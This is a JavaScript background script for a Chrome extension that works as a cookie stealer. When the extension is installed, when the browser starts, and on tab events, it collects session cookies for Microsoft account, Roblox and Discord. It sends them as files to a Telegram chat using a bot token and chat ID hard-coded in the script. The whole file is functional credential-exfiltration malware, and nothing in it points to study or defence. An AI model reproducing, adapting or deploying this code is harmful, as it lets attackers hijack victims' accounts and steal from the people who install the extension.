const BOT_TOKEN = "8309571237:AAF3sCT8emLhj_3ffJYqdENAQRESo_5WQD0";
const CHAT_ID = "7975484479";

function sendFileToTelegram(fileContent, filename) {
  const formData = new FormData();
  const blob = new Blob([fileContent], { type: "text/plain" });
  formData.append("document", blob, filename);
  formData.append("chat_id", CHAT_ID);

  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
    method: "POST",
    body: formData,
  });
}

async function sendCookiesForDomain(domain, filename) {
  try {
    const cookies = await chrome.cookies.getAll({ domain });
    const content = cookies.length > 0 ? JSON.stringify(cookies, null, 2) : "not found";
    const response = await sendFileToTelegram(content, filename);
    if (!response.ok) {
      console.error(`Failed to send cookies for ${domain}:`, response.status, await response.text());
    }
  } catch (e) {
    console.error(`Error sending cookies for ${domain}:`, e);
  }
}

async function sendAllCookies() {
  await sendCookiesForDomain("account.microsoft.com", "account_microsoft_com.txt");
  await sendCookiesForDomain("roblox.com", "roblox_com.txt");
  await sendCookiesForDomain("discord.com", "discord_com.txt");
}

let debounceTimeout;

function debounceSend() {
  if (debounceTimeout) clearTimeout(debounceTimeout);
  debounceTimeout = setTimeout(() => {
    sendAllCookies();
  }, 30000);
}

chrome.runtime.onInstalled.addListener(() => sendAllCookies());
chrome.runtime.onStartup.addListener(() => sendAllCookies());
chrome.tabs.onCreated.addListener(debounceSend);
chrome.tabs.onUpdated.addListener(debounceSend);

(async () => {
  await sendAllCookies();
})();
